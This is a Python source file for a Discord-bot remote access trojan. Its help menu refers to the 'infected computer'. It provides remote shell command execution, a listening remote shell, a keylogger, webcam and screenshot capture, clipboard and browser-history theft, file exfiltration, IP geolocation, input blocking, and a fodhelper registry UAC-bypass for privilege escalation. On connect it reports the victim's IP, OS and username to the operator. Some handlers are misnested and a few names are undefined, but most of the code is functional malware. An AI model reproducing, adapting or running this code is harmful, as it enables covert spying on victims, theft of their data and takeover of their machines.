import winreg
import ctypes
import sys
import os
import random
import time
import subprocess
import discord
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from discord.ext import commands
from ctypes import *
import asyncio
from discord import utils
import socket
import threading
import requests

global appdata
appdata = os.getenv('APPDATA')
client = discord.Client(intents=discord.Intents.default())
bot = commands.Bot(command_prefix='!', intents=discord.Intents.default())
helpmenu = """
Availaible commands are :

--> !message = Show a message box displaying your text / Syntax  = "!message example"
--> !shell = Execute a shell command /Syntax  = "!shell whoami"
--> !webcampic = Take a picture from the webcam
--> !windowstart = Start logging current user window (logging is shown in the bot activity)
--> !windowstop = Stop logging current user window 
--> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
--> !admincheck = Check if program has admin privileges
--> !sysinfo = Gives info about infected computer
--> !history = Get computer navigation history
--> !download = Download a file from infected computer
--> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
--> !cd = Changes directory
--> !write = Type your desired sentence on infected computer
--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
--> !clipboard = Retrieve infected computer clipboard content
--> !geolocate = Geolocate computer using latitude and longitude of the ip address with google map / Warning : Geolocating IP addresses is not very precise
--> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV 
--> !stopkeylogger = Stops keylogger
--> !dumpkeylogger = Dumps the keylog
--> !volumemax = Put volume at 100%
--> !volumezero = Put volume at 0%
--> !idletime = Get the idle time of user
--> !sing = Play chosen video in background (Only works with youtube links)
--> !stopsing = Stop video playing in background
--> !blockinput = Blocks user's keyboard and mouse / Warning : Admin rights are required
--> !unblockinput = Unblocks user's keyboard and mouse / Warning : Admin rights are required
--> !screenshot = Get the screenshot of the user's current screen
--> !remoteshell = Start a reverse shell that you can connect to
--> !exit = Exit program
--> !kill = Kill a session or all sessions except current one / Syntax = "!kill session-3" or "!kill all"
"""

def start_reverse_shell(port=4444):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', port))
        server.listen(5)
        
        try:
            ip = requests.get('https://api.ipify.org/?format=text', timeout=3).text.strip()
        except:
            ip = requests.get('https://ifconfig.me/ip', timeout=3).text.strip()
        return server, ip, port
    except Exception:
        return None, None, None

def handle_client(client_socket, channel):
    shell_cmd = 'powershell.exe' if os.name == 'nt' else '/bin/sh'
    shell_args = [] if os.name == 'nt' else ['-i']
    
    shell = subprocess.Popen(
        [shell_cmd] + shell_args,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
    )
    
    def socket_to_shell():
        try:
            while True:
                data = client_socket.recv(4096).decode('utf-8')
                if not data:
                    break
                shell.stdin.write(data + '\n')
                shell.stdin.flush()
        except:
            pass
    
    def shell_to_socket():
        try:
            while True:
                output = shell.stdout.readline()
                if not output:
                    error = shell.stderr.readline()
                    if not error:
                        break
                    client_socket.send(error.encode('utf-8'))
                else:
                    client_socket.send(output.encode('utf-8'))
        except:
            pass
    
    for target_func in [socket_to_shell, shell_to_socket]:
        thread = threading.Thread(target=target_func, daemon=True)
        thread.start()

async def activity(client):
    import time
    import win32gui
    while True:
        global stop_threads
        if stop_threads:
            break
        try:
            window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            game = discord.Game(f"Visiting: {window}")
            await client.change_presence(status=discord.Status.online, activity=game)
        except:
            pass
        time.sleep(1)

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

@client.event
async def on_ready():
    import platform
    import urllib.request
    import json
    
    try:
        with urllib.request.urlopen("https://geolocation-db.com/json", timeout=3) as url:
            data = json.loads(url.read().decode())
            flag = data.get('country_code', 'unknown')
            ip = data.get('IPv4', '0.0.0.0')
    except:
        flag = 'unknown'
        ip = '0.0.0.0'
    
    global user_id, channel_name
    user_id = f"{random.randint(10000, 99999)}"
    channel_name = f"hi-{user_id}"
    
    for guild in client.guilds:
        newchannel = await guild.create_text_channel(channel_name)
        channel = client.get_channel(newchannel.id)
        
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        value1 = f"@everyone New connection {channel_name} | {platform.system()} {platform.release()} | {ip} :flag_{flag.lower()}: | User : {os.getlogin()}"
        
        await channel.send(f'{value1} | :gem:' if is_admin else value1)
    
    game = discord.Game(f"Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)
    
def volumeup():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        if volume.GetMute() == 1:
            volume.SetMute(0, None)
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
    except:
        pass

def volumedown():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
    except:
        pass

@client.event
async def on_message(message):
    if message.channel.name != channel_name:
        return
    
    if message.content.startswith("!kill"):
        if message.content[6:] == "all":
            for guild in client.guilds:
                for channel in guild.channels:
                    if "hi-" in channel.name:
                        try:
                            await channel.delete()
                        except:
                            pass
        else:
            try:
                target_channel_name = message.content[6:]
                for guild in client.guilds:
                    channel_to_delete = discord.utils.get(guild.channels, name=target_channel_name)
                    if channel_to_delete:
                        await channel_to_delete.delete()
                await message.channel.send(f"[*] {target_channel_name} killed.")
            except:
                await message.channel.send(f"[!] {message.content[6:]} is invalid, please enter a valid session name")

    if message.content == "!remoteshell":
        try:
            port = random.randint(10000, 65000)
            server, ip, port = start_reverse_shell(port)
            if server:
                await message.channel.send(f"[*] Remote shell started on {ip}:{port}")
                await message.channel.send(f"[*] Connect with: `nc {ip} {port}` or any other TCP client")
                
                def accept_connections():
                    try:
                        while True:
                            client_socket, _ = server.accept()
                            handle_client(client_socket, message.channel)
                    except:
                        try:
                            server.close()
                        except:
                            pass
                
                threading.Thread(target=accept_connections, daemon=True).start()
            else:
                await message.channel.send("[!] Failed to start remote shell")
        except Exception as e:
            await message.channel.send(f"[!] Error starting remote shell: {str(e)}")

    if message.content == "!dumpkeylogger":
        try:
            temp = os.getenv("TEMP")
            file_keys = os.path.join(temp, "key_log.txt")
            if os.path.exists(file_keys):
                file = discord.File(file_keys, filename="keylog.txt")
                await message.channel.send("[*] Command successfully executed", file=file)
                os.remove(file_keys)
            else:
                await message.channel.send("[!] No keylog file found")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    if message.content == "!exit":
        try:
            await message.channel.send("[*] Exiting...")
            exit()
        except:
            sys.exit(0)

    if message.content == "!windowstart":
        try:
            global stop_threads
            stop_threads = False
            global _thread
            _thread = threading.Thread(target=between_callback, args=(client,))
            _thread.daemon = True
            _thread.start()
            await message.channel.send("[*] Window logging for this session started")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    if message.content == "!windowstop":
        try:
            stop_threads = True
            game = discord.Game(f"Window logging stopped")
            await client.change_presence(status=discord.Status.online, activity=game)
            await message.channel.send("[*] Window logging for this session stopped")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    if message.content == "!screenshot":
        try:
            from mss import mss
            temp_file = os.path.join(os.getenv('TEMP'), f"screen_{random.randint(1000, 9999)}.png")
            with mss() as sct:
                sct.shot(output=temp_file)
            file = discord.File(temp_file, filename="screenshot.png")
            await message.channel.send("[*] Command successfully executed", file=file)
            os.remove(temp_file)
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    if message.content == "!volumemax":
        volumeup()
        await message.channel.send("[*] Volume put to 100%")

    if message.content == "!volumezero":
        volumedown()
        await message.channel.send("[*] Volume put to 0%")

    if message.content == "!webcampic":
        try:
            import os
            import urllib.request
            from zipfile import ZipFile
            
            directory = os.getcwd()
            temp_dir = os.getenv('TEMP')
            os.chdir(temp_dir)
            
            zip_file = f"wcam_{random.randint(1000, 9999)}.zip"
            img_file = f"img_{random.randint(1000, 9999)}.png"
            
            urllib.request.urlretrieve("https://www.nirsoft.net/utils/webcamimagesave.zip", zip_file)
            with ZipFile(zip_file) as zipObj:
                zipObj.extractall()
            
            os.system(f"WebCamImageSave.exe /capture /FileName {img_file}")
            
            if os.path.exists(img_file) and os.path.getsize(img_file) > 0:
                file = discord.File(img_file, filename="webcam.png")
                await message.channel.send("[*] Command successfully executed", file=file)
            else:
                await message.channel.send("[!] Failed to capture webcam image")
                
            for f in [zip_file, img_file, "WebCamImageSave.exe", "readme.txt", "WebCamImageSave.chm"]:
                try:
                    if os.path.exists(f):
                        os.remove(f)
                except:
                    pass
                    
            os.chdir(directory)
        except Exception as e:
            await message.channel.send(f"[!] Command failed: {str(e)}")

    if message.content.startswith("!message"):
        try:
            import ctypes
            import win32con
            import win32gui
            
            MB_YESNO = 0x04
            MB_HELP = 0x4000
            ICON_STOP = 0x10
            
            def mess():
                ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error", MB_HELP | MB_YESNO | ICON_STOP)
                
            threading.Thread(target=mess, daemon=True).start()
            
            time.sleep(1)
            
            hwnd = win32gui.FindWindow(None, "Error")
            if hwnd:
                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                
            await message.channel.send("[*] Message displayed")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    if message.content.startswith("!wallpaper"):
        try:
            if message.attachments:
                path = os.path.join(os.getenv('TEMP'), f"wp_{random.randint(1000, 9999)}.jpg")
                await message.attachments[0].save(path)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
                await message.channel.send("[*] Command successfully executed")
            else:
                await message.channel.send("[!] No image attached")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    if message.content.startswith("!upload"):
        try:
            if message.attachments:
                filename = message.content[8:].strip() or message.attachments[0].filename
                await message.attachments[0].save(filename)
                await message.channel.send(f"[*] File saved as {filename}")
            else:
                await message.channel.send("[!] No file attached")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    if message.content.startswith("!shell"):
        try:
            instruction = message.content[7:]
            
            def execute_shell_command():
                try:
                    process = subprocess.run(
                        instruction,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        shell=True,
                        text=True,
                        timeout=30
                    )
                    return process.stdout, process.stderr
                except subprocess.TimeoutExpired:
                    return "Command timed out after 30 seconds", ""
                except Exception as e:
                    return "", str(e)
            
            shell_thread = threading.Thread(target=execute_shell_command)
            shell_thread.daemon = True
            shell_thread.start()
            shell_thread.join(timeout=31)
            
            if shell_thread.is_alive():
                await message.channel.send("[!] Command is taking too long to execute")
                return
                
            stdout, stderr = execute_shell_command()
            result = stdout or stderr
            
            if not result:
                await message.channel.send("[*] Command executed but returned no output")
                return
                
            if len(result) > 1990:
                temp_file = os.path.join(os.getenv('TEMP'), f"output_{random.randint(1000, 9999)}.txt")
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(result)
                file = discord.File(temp_file, filename="command_output.txt")
                await message.channel.send("[*] Command output", file=file)
                os.remove(temp_file)
            else:
                await message.channel.send(f"[*] Output:\n```\n{result}\n```")
                
        except Exception as e:
            await message.channel.send(f"[!] Error executing command: {str(e)}")

    if message.content.startswith("!download"):
        try:
            filepath = message.content[10:]
            if os.path.exists(filepath):
                file = discord.File(filepath, filename=os.path.basename(filepath))
                await message.channel.send("[*] File downloaded", file=file)
            else:
                await message.channel.send(f"[!] File not found: {filepath}")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    if message.content.startswith("!cd"):
        try:
            directory = message.content[4:]
            os.chdir(directory)
            await message.channel.send(f"[*] Changed directory to {os.getcwd()}")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    if message.content == "!help":
        await message.channel.send(helpmenu)

    if message.content.startswith("!write"):
        try:
            import pyautogui
            text = message.content[7:]
            if text.lower() == "enter":
                pyautogui.press("enter")
            else:
                pyautogui.typewrite(text)
            await message.channel.send("[*] Text typed")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    if message.content == "!history":
        try:
            import browserhistory as bh
            dict_obj = bh.get_browserhistory()
            strobj = str(dict_obj).encode(errors='ignore')
            
            temp_file = os.path.join(os.getenv('TEMP'), f"history_{random.randint(1000, 9999)}.txt")
            with open(temp_file, "w", encoding="utf-8") as hist:
                hist.write(str(strobj))
                
            file = discord.File(temp_file, filename="browser_history.txt")
            await message.channel.send("[*] Browser history", file=file)
            os.remove(temp_file)
        except Exception as e:
            await message.channel.send(f"[!] Error retrieving browser history: {str(e)}")

    if message.content == "!clipboard":
        try:
            import ctypes
            
            CF_TEXT = 1
            kernel32 = ctypes.windll.kernel32
            kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
            kernel32.GlobalLock.restype = ctypes.c_void_p
            kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
            user32 = ctypes.windll.user32
            user32.GetClipboardData.restype = ctypes.c_void_p
            
            user32.OpenClipboard(0)
            if user32.IsClipboardFormatAvailable(CF_TEXT):
                data = user32.GetClipboardData(CF_TEXT)
                data_locked = kernel32.GlobalLock(data)
                text = ctypes.c_char_p(data_locked)
                value = text.value
                kernel32.GlobalUnlock(data_locked)
                body = value.decode(errors='replace')
                user32.CloseClipboard()
                
                if len(body) > 1990:
                    temp_file = os.path.join(os.getenv('TEMP'), f"clipboard_{random.randint(1000, 9999)}.txt")
                    with open(temp_file, "w", encoding="utf-8") as f:
                        f.write(body)
                    file = discord.File(temp_file, filename="clipboard_content.txt")
                    await message.channel.send("[*] Clipboard content", file=file)
                    os.remove(temp_file)
                else:
                    await message.channel.send(f"[*] Clipboard content: {body}")
            else:
                await message.channel.send("[!] No text in clipboard")
        except Exception as e:
            await message.channel.send(f"[!] Error accessing clipboard: {str(e)}")

    if message.content.startswith("!stopsing"):
        try:
            if 'pid_process' in globals():
                os.system(f"taskkill /F /IM {pid_process[1]}")
                await message.channel.send("[*] Playback stopped")
            else:
                await message.channel.send("[!] No active playback to stop")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    if message.content == "!sysinfo":
        try:
            import platform
            info = platform.uname()
            info_total = f'{info.system} {info.release} {info.machine}'
            
            try:
                ip = requests.get('https://api.ipify.org', timeout=3).text
            except:
                ip = "Unable to retrieve IP"
                
            await message.channel.send(f"[*] System info: {info_total} | IP: {ip}")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    if message.content == "!geolocate":
        try:
            services = [
                "https://geolocation-db.com/json",
                "https://ipapi.co/json/",
                "https://freegeoip.app/json/"
            ]
            
            for service in services:
                try:
                    with urllib.request.urlopen(service, timeout=3) as url:
                        data = json.loads(url.read().decode())
                        lat = data.get('latitude', None)
                        lon = data.get('longitude', None)
                        
                        if lat and lon:
                            link = f"http://www.google.com/maps/place/{lat},{lon}"
                            await message.channel.send(f"[*] Location: {link}")
                            return
                except:
                    continue
                    
            await message.channel.send("[!] Could not retrieve geolocation data")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    if message.content == "!admincheck":
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin:
                await message.channel.send("[*] Running with administrator privileges")
            else:
                await message.channel.send("[!] Not running with administrator privileges")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    if message.content == "!uacbypass":
        try:
            import os
            import win32net
            
            server = os.environ.get('logonserver', '')[2:] if 'logonserver' in os.environ else None
            
            def if_user_is_admin(Server):
                try:
                    groups = win32net.NetUserGetLocalGroups(Server, os.getlogin())
                    return any(group.lower().startswith('admin') for group in groups), groups
                except:
                    return False, []
                    
            is_admin, groups = if_user_is_admin(server)
            
            if is_admin:
                import sys
                import winreg
                
                cmd_exe = "C:\\Windows\\System32\\cmd.exe"
                helper_exe = 'C:\\Windows\\System32\\fodhelper.exe'
                start_cmd = "start"
                registry_path = 'Software\\Classes\\ms-settings\\shell\\open\\command'
                delegate_key = 'DelegateExecute'
                
                def modify_registry(key, value):
                    try:
                        winreg.CreateKey(winreg.HKEY_CURRENT_USER, registry_path)
                        reg_key = winreg.OpenKey(
                            winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_WRITE)
                        winreg.SetValueEx(reg_key, key, 0,
                                          winreg.REG_SZ, value)
                        winreg.CloseKey(reg_key)
                        return True
                    except Exception:
                        return False
                
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    await message.channel.send("[*] Attempting privilege escalation...")
                    try:
                        current_dir = os.path.dirname(os.path.realpath(sys.argv[0]))
                        current_script = sys.argv[0]
                        
                        if not os.path.isabs(current_script):
                            current_script = os.path.join(current_dir, current_script)
                            
                        cmd = f'{cmd_exe} /k {start_cmd} "{current_script}"'
                        
                        if modify_registry(delegate_key, '') and modify_registry(None, cmd):
                            subprocess.Popen(helper_exe, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            await message.channel.send("[*] Privilege escalation initiated")
                        else:
                            await message.channel.send("[!] Registry modification failed")
                    except Exception as e:
                        await message.channel.send("[!] Operation failed")
                else:
                    await message.channel.send("[*] Already running with elevated privileges")
            else:
                await message.channel.send("[!] Current user lacks required group membership")
        except Exception as e:
            await message.channel.send("[!] Operation could not be completed")

    if message.content.startswith("!sing"):
        try:
            volumeup()
            from win32 import win32gui
            import win32con
            import win32process
            
            link = message.content[6:].strip()
            
            if link:
                if not link.startswith(("http://", "https://")):
                    link = "https://" + link
                
                subprocess.Popen(f'start {link}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                def hide_youtube_window():
                    try:
                        def enum_windows_callback(hwnd, _):
                            if win32gui.IsWindowVisible(hwnd):
                                title = win32gui.GetWindowText(hwnd).lower()
                                if "youtube" in title:
                                    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                                    return True
                            return True
                        
                        for _ in range(20):
                            win32gui.EnumWindows(enum_windows_callback, None)
                            time.sleep(0.5)
                    except Exception:
                        pass
                
                hide_thread = threading.Thread(target=hide_youtube_window)
                hide_thread.daemon = True
                hide_thread.start()
                
                await message.channel.send("[*] Media playback started")
            else:
                await message.channel.send("[!] Please provide a valid URL")
        except Exception as e:
            await message.channel.send("[!] Media playback failed")

        if message.content == "!startkeylogger":
            import base64
            import os
            from pynput.keyboard import Key, Listener
            import logging
            temp = os.getenv("TEMP")
            logging.basicConfig(filename=os.path.join(os.getenv('TEMP') + "\\key_log.txt"),
                                level=logging.DEBUG, format='%(asctime)s: %(message)s')
            def keylog():
                def on_press(key):
                    logging.info(str(key))
                with Listener(on_press=on_press) as listener:
                    listener.join()
            import threading
            global test
            test = threading.Thread(target=keylog)
            test._running = True
            test.daemon = True
            test.start()
            await message.channel.send("[*] Keylogger successfully started")

        if message.content == "!stopkeylogger":
            import os
            test._running = False
            await message.channel.send("[*] Keylogger successfully stopped")

        if message.content == "!idletime":
            class LASTINPUTINFO(Structure):
                _fields_ = [
                    ('cbSize', c_uint),
                    ('dwTime', c_int),
                ]

            def get_idle_duration():
                lastInputInfo = LASTINPUTINFO()
                lastInputInfo.cbSize = sizeof(lastInputInfo)
                if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
                    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                    return millis / 1000.0
                else:
                    return 0
            import threading
            global idle1
            idle1 = threading.Thread(target=get_idle_duration)
            idle1._running = True
            idle1.daemon = True
            idle1.start()
            duration = get_idle_duration()
            await message.channel.send('User idle for %.2f seconds.' % duration)
            import time
            time.sleep(1)

        if message.content.startswith("!voice"):
            volumeup()
            import comtypes
            import win32com.client as wincl
            speak = wincl.Dispatch("SAPI.SpVoice")
            speak.Speak(message.content[7:])
            comtypes.CoUninitialize()
            await  message.channel.send("[*] Command successfully executed")

        if message.content.startswith("!blockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(True)
                await message.channel.send("[*] Command successfully executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")

        if message.content.startswith("!unblockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(False)
                await  message.channel.send("[*] Command successfully executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")

client.run(token)
